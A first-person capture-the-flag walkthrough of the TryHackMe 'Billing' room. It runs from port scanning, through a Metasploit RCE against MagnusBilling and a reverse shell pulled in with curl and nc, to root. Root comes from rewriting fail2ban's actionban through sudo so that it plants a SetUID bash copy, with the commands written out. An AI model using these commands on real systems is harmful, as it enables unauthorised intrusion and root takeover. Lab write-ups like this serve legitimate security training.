# Billing

URL: https://tryhackme.com/room/billing

# Enumeration
First things first, let's set our hosts file and port scan the machine to see what we are working with

```
┌──(kali㉿kali)-[~]
└─$ sudo vi /etc/hosts  
[sudo] password for kali: 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ rustscan -a billing.thm 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Because guessing isn't hacking.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.193.155:22
Open 10.10.193.155:80
Open 10.10.193.155:3306
Open 10.10.193.155:5038
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 12:43 PST
Initiating Ping Scan at 12:43
Scanning 10.10.193.155 [4 ports]
Completed Ping Scan at 12:43, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:43
Scanning billing.thm (10.10.193.155) [4 ports]
Discovered open port 80/tcp on 10.10.193.155
Discovered open port 22/tcp on 10.10.193.155
Discovered open port 3306/tcp on 10.10.193.155
Discovered open port 5038/tcp on 10.10.193.155
Completed SYN Stealth Scan at 12:43, 0.18s elapsed (4 total ports)
Nmap scan report for billing.thm (10.10.193.155)
Host is up, received timestamp-reply ttl 61 (0.16s latency).
Scanned at 2025-03-07 12:43:55 PST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 61
80/tcp   open  http    syn-ack ttl 61
3306/tcp open  mysql   syn-ack ttl 61
5038/tcp open  unknown syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (216B)
```

# The App
We'll start with 80, since we dont have credentials for anything else yet. In the browser, we are forwarded to /mbilling/. Is it vulnerable to anything?

Exploitdb:

```
┌──(kali㉿kali)-[~]
└─$ searchsploit mbilling
Exploits: No Results
Shellcodes: No Results
```

Hrm. Let's throw gobuster at it and see what we find in the shadows:

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x "php,txt,html" -k --url http://billing.thm/mbilling
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://billing.thm/mbilling
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/LICENSE              (Status: 200) [Size: 7652]
/archive              (Status: 301) [Size: 321] [--> http://billing.thm/mbilling/archive/]
/assets               (Status: 301) [Size: 320] [--> http://billing.thm/mbilling/assets/]
/cron.php             (Status: 200) [Size: 0]
/fpdf                 (Status: 301) [Size: 318] [--> http://billing.thm/mbilling/fpdf/]
/index.php            (Status: 200) [Size: 663]
/index.html           (Status: 200) [Size: 30760]
/lib                  (Status: 301) [Size: 317] [--> http://billing.thm/mbilling/lib/]
/protected            (Status: 403) [Size: 276]
/resources            (Status: 301) [Size: 323] [--> http://billing.thm/mbilling/resources/]
/tmp                  (Status: 301) [Size: 317] [--> http://billing.thm/mbilling/tmp/]
Progress: 81912 / 81916 (100.00%)
===============================================================
Finished
===============================================================
```

OK, pretty benign. The protected directory is well...protected. Nothing for you in any of the other directories. Google to the rescue? We find mbilling is actually MagnusBilling. v6 and 7 of MagnusBilling are vulnerable to an unauth'd RCE when icepay is configured. And, Metasploit has a module! https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/

Did we enable icepay?

```
Index of /mbilling/lib
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[DIR]	GoogleAuthenticator/	2024-02-27 09:44 	- 	 
[DIR]	PlacetoPay/	2024-02-27 09:44 	- 	 
[DIR]	anet/	2024-02-27 09:44 	- 	 
[ ]	composer.json	2024-02-27 09:44 	64 	 
[ ]	composer.lock	2024-02-27 09:44 	2.4K	 
[DIR]	gerencianet/	2024-02-27 09:44 	- 	 
[DIR]	icepay/	2024-09-09 23:27 	- 	 
[DIR]	mercadopago/	2024-02-27 09:44 	- 	 
[DIR]	stripe/	2024-02-27 09:44 	- 	 
Apache/2.4.56 (Debian) Server at billing.thm Port 80
```

We sure did! So, msfconsole it is. Let's hope we have a vulnerable version installed!

# The entry exploit
```
msf > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
msf exploit(magnusbilling_unauth_rce_cve_2023_30258) > show targets
    ...targets...
msf exploit(magnusbilling_unauth_rce_cve_2023_30258) > set TARGET < target-id >
msf exploit(magnusbilling_unauth_rce_cve_2023_30258) > show options
    ...show and set options...
msf exploit(magnusbilling_unauth_rce_cve_2023_30258) > exploit
```

I dont know what I did wrong, but exploit failed and I could no longer reach the host. After a reset of the target machine I tried the exploit again and got a shell!

I dont like using the metasploit reverse shell for long, and this host has proven it has something defensive up it's sleeve so persistence is the next order of business. I remembered that tmp/ directory on the server, so I cURL'd over a generic PHP reverse shell there and fired up a more stable shell using nc.

I then used the python magic shell technique here https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-3-upgrading-from-netcat-with-magic to get a useful tty.

On the now fully functional terminal, I cURL'd over linpeas and ran it. It was rather empty of worth-while findings. It did show that I could read /home directories, and I was correct about the defenses; fail2ban was running. My user was in SUDOers as well.

```
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
...
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/home/magnus/.bash_history
...
```

Interesting. Let's keep that tucked away for later. First, let's see if we can find that user.txt flag. Linpeas didn't show it in any odd places, so let's just check /home/magnus.

```
asterisk@Billing:/tmp$ cd /home/magnus
asterisk@Billing:/home/magnus$ ls
...
user.txt
...
asterisk@Billing:/home/magnus$ cat user.txt
```
One down, one to go.

# But the pivot Mason, where is it?
Awesome, half way home. now we need to figure out how to escalate our privs to root. I first looked into the mariadb service. I ended up finding the user and password in a config file (/etc/asterisk/*mysql.conf) and was able to find the root asterisk user's hash. I grabbed that, and took it to crackstation.net. No password was found, so I pivoted away from that.

Remembering I had sudo rights, I took a look at fail2ban-client. Issuing the "help" command gave me a plethora of options. I wondered if any of them were behind other authorization, so I went loud and tried to the stop the server

```
asterisk@Billing:/var/www/html/mbilling$ sudo /usr/bin/fail2ban-client stop
Shutdown successful
```

Oh really??!? I began searching for a way to get this client to drop to a shell. Turns out there is no native way. But after a little more digging, I found this write up of (ab)using fail2ban's jail actions: https://juggernaut-sec.com/fail2ban-lpe/

Now, we dont have access to the files in action.d like he did, but there are some interesting actions we can do with the client using the info he provided.

```
asterisk@Billing:/etc/fail2ban/action.d$ sudo /usr/bin/fail2ban-client start
Server ready
asterisk@Billing:/etc/fail2ban/action.d$ sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
asterisk@Billing:/etc/fail2ban/action.d$ sudo /usr/bin/fail2ban-client get sshd actions
The jail sshd has the following actions:
iptables-multiport
asterisk@Billing:/etc/fail2ban/action.d$ sudo /usr/bin/fail2ban-client get sshd action iptables-multiport actionban
<iptables> -I f2b-sshd 1 -s <ip> -j <blocktype>
asterisk@Billing:/etc/fail2ban/action.d$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash"
cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
asterisk@Billing:/etc/fail2ban/action.d$ sudo /usr/bin/fail2ban-client get sshd action iptables-multiport actionban                                                 
cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
```
(Note: do not reload the config, you dont need to and it will just "fix" what you broke...)

Now, in theory all I needed to do was get an IP blacklisted. This is easy, just fail log in on sshd 5 times. I used hydra, but this is overkill; you could do it manually just as fast.


Once we're blacklisted, lets' see if our binary copy worked:
```
asterisk@Billing:/etc/fail2ban/action.d$ sudo /usr/bin/fail2ban-client unban --all                                 
1
asterisk@Billing:/etc/fail2ban/action.d$ cd /tmp
asterisk@Billing:/tmp$ ls 
lse.pl
pspy
bash
```

Yep, it is SetUID as well. Nothing left to it...

```
asterisk@Billing:/tmp$ ./bash -p
whoami
root
cat /root/root.txt
```

Enter your flags and you're done!
